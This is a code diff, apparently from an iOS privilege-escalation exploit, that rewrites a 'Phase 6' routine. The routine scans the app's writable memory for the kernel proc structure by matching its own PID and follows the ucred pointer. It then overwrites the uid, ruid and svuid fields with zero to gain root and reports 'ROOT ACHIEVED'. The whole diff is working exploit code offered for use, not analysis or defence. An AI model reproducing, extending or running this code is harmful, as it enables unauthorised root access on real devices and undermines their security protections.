@@ -215,15 +215,13 @@ static BOOL isKernelPointer(uint64_t v) {
 
     [report appendFormat:@"regions with kernel pointers: %d\n", regionWithKptrs];
 
-    // --- Phase 6: search for proc/ucred structures + root ---
-    // asuka4scape offsets: proc->p_pid=0x60, proc->ucred=0x28, ucred->cr_uid=0x18
+    // --- Phase 6: proc/ucred hunt + root (broader scan) ---
     if (regionWithKptrs > 0) {
         [report appendString:@"\n--- Phase 6: proc/ucred hunt + root ---\n"];
         int myPID = getpid();
         int myUID = getuid();
         [report appendFormat:@"our pid=%d uid=%d\n", myPID, myUID];
 
-        // Re-scan writable regions looking for proc/ucred patterns
         scanAddr = 0; scanSize = 0;
         int procFound = 0;
 
@@ -239,78 +237,50 @@ static BOOL isKernelPointer(uint64_t v) {
 
             volatile uint8_t *base = (volatile uint8_t *)scanAddr;
 
-            // Look for proc struct: p_pid at +0x60 matching our PID
-            for (size_t off = 0; off + 0x400 < scanSize; off += 8) {
-                uint32_t pid_val = *(volatile uint32_t *)(base + off + 0x60);
-                if (pid_val != (uint32_t)myPID) continue;
+            for (size_t off = 0; off + 0x40 < scanSize; off += 4) {
+                uint32_t val = *(volatile uint32_t *)(base + off);
+                if (val != (uint32_t)myPID) continue;
 
-                // Check if +0x28 is a kernel pointer (ucred)
-                uint64_t ucred_ptr = *(volatile uint64_t *)(base + off + 0x28);
-                if (!isKernelPointer(ucred_ptr) || ucred_ptr == 0xffffffffffffffffULL) continue;
+                [report appendFormat:@"PID match at region+0x%zx\n", off];
 
-                // Check if +0x08 is a kernel pointer (task)
-                uint64_t task_ptr = *(volatile uint64_t *)(base + off + 0x08);
-                if (!isKernelPointer(task_ptr) || task_ptr == 0xffffffffffffffffULL) continue;
+                if (off >= 0x60 && off + 0x400 < scanSize) {
+                    size_t pb = off - 0x60;
+                    uint64_t uc = *(volatile uint64_t *)(base + pb + 0x28);
+                    uint64_t tk = *(volatile uint64_t *)(base + pb + 0x08);
+                    if (isKernelPointer(uc) && uc != 0xffffffffffffffffULL &&
+                        isKernelPointer(tk) && tk != 0xffffffffffffffffULL) {
+                        [report appendFormat:@"  PROC @ +0x%zx ucred=0x%llx task=0x%llx\n", pb, uc, tk];
+                        procFound++;
 
-                procFound++;
-                [report appendFormat:@"*** PROC FOUND @ region+0x%zx ***\n", off];
-                [report appendFormat:@"  p_pid = %d\n", pid_val];
-                [report appendFormat:@"  task = 0x%llx\n", task_ptr];
-                [report appendFormat:@"  ucred = 0x%llx\n", ucred_ptr];
-
-                // Try to read ucred->cr_uid (if ucred is in a writable region)
-                // First, find ucred in our writable regions
-                uint8_t *ucred_local = NULL;
-                scanAddr = 0; scanSize = 0;
-                while (1) {
-                    scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
-                    scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
-                    uint32_t d3 = 0;
-                    if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d3,
-                                              (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
-                    if (scanInfo.is_submap) continue;
-                    if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
-                    // Check if ucred_ptr falls within this region
-                    if (ucred_ptr >= scanAddr && ucred_ptr < scanAddr + scanSize) {
-                        ucred_local = (uint8_t *)ucred_ptr;
-                        [report appendFormat:@"  ucred mapped at 0x%lx (region 0x%lx)\n",
-                         (unsigned long)ucred_local, (unsigned long)scanAddr];
-                        break;
-                    }
-                }
-
-                if (ucred_local) {
-                    uint32_t cr_uid = *(volatile uint32_t *)(ucred_local + 0x18);
-                    [report appendFormat:@"  cr_uid = %d\n", cr_uid];
-
-                    if (cr_uid == (uint32_t)myUID) {
-                        [report appendString:@"  *** ROOT ATTEMPT: setting cr_uid = 0 ***\n"];
-                        *(volatile uint32_t *)(ucred_local + 0x18) = 0;
-                        *(volatile uint32_t *)(ucred_local + 0x1c) = 0; // cr_ruid
-                        *(volatile uint32_t *)(ucred_local + 0x20) = 0; // cr_svuid
-
-                        // Verify
-                        uint32_t new_uid = *(volatile uint32_t *)(ucred_local + 0x18);
-                        [report appendFormat:@"  cr_uid after write: %d\n", new_uid];
-                        [report appendFormat:@"  getuid() now: %d\n", getuid()];
-
-                        if (getuid() == 0) {
-                            [report appendString:@"  *** ROOT ACHIEVED ***\n"];
+                        uint8_t *ulocal = NULL;
+                        vm_address_t ta = 0; vm_size_t ts = 0;
+                        while (1) {
+                            ta = (ta == 0) ? 0 : ta + ts;
+                            uint32_t d3 = 0;
+                            mach_msg_type_number_t tc = VM_REGION_SUBMAP_INFO_COUNT_64;
+                            vm_region_submap_info_data_64_t ti;
+                            if (vm_region_recurse_64(mach_task_self(), &ta, &ts, &d3,
+                                                      (vm_region_recurse_info_t)&ti, &tc) != KERN_SUCCESS) break;
+                            if (ti.is_submap) continue;
+                            if (uc >= ta && uc < ta + ts) { ulocal = (uint8_t *)uc; break; }
+                        }
+                        if (ulocal) {
+                            uint32_t uid = *(volatile uint32_t *)(ulocal + 0x18);
+                            [report appendFormat:@"  ucred mapped, cr_uid=%u\n", uid];
+                            *(volatile uint32_t *)(ulocal + 0x18) = 0;
+                            *(volatile uint32_t *)(ulocal + 0x1c) = 0;
+                            *(volatile uint32_t *)(ulocal + 0x20) = 0;
+                            [report appendFormat:@"  getuid() now: %d\n", getuid()];
+                            if (getuid() == 0) [report appendString:@"  *** ROOT ACHIEVED ***\n"];
+                        } else {
+                            [report appendString:@"  ucred not in writable regions\n"];
                         }
                     }
-                } else {
-                    [report appendString:@"  ucred NOT in writable region (kernel-only)\n"];
-                    [report appendString:@"  Need kernel write primitive to modify it.\n"];
                 }
             }
-
             if (procFound > 0) break;
         }
-
-        if (procFound == 0) {
-            [report appendString:@"proc struct not found in writable regions.\n"];
-            [report appendString:@"Try: scan more regions, or use kernel write to search.\n"];
-        }
+        if (procFound == 0) [report appendString:@"proc not found in writable regions.\n"];
     }
 
     // --- Phase 7: output diff test (kirby technique) ---
